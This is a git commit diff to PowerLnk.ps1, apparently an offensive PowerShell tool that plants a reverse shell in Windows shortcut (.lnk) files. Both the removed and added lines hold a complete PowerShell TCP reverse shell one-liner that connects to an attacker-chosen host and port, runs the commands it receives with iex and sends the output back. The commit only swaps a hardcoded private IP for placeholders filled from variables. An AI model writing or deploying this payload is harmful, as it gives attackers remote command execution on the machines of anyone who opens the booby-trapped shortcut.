b0ce9c4c5c75eaf5125428894ab65fac9deb6b2c
john-xor <61298039+john-xor@users.noreply.github.com>
2022-12-14 04:00:10 -0900

    Update PowerLnk.ps1

--- PowerLnk.ps1
+++ PowerLnk.ps1
@@ -3,7 +3,7 @@ $ErrorActionPreference="SilentlyContinue"
 
 #this can be modified to your liking, however lnk files have a limit on argument length so don't make it too long
 $rev_shell = @'
-$x=(New-Object net.sockets.tcpclient("192.168.1.26",443)).getstream();[byte[]]$b=0..65535|%{0};while(($i=$x.read($b,0,$b.Length))-ne 0){$d=([system.text.encoding]::getencoding(20127)).getbytes(((iex((New-Object -t text.asciiencoding).getstring($b,0,$i))2>&1|out-string)+(pwd).path+"> "));$x.write($d,0,$d.Length);$x.flush()}
+$x=(New-Object net.sockets.tcpclient("~",!)).getstream();[byte[]]$b=0..65535|%{0};while(($i=$x.read($b,0,$b.Length))-ne 0){$d=([system.text.encoding]::getencoding(20127)).getbytes(((iex((New-Object -t text.asciiencoding).getstring($b,0,$i))2>&1|out-string)+(pwd).path+"> "));$x.write($d,0,$d.Length);$x.flush()}
 '@ -replace '~',$ip -replace '!',$port
 
 #convert reverse shell to base64
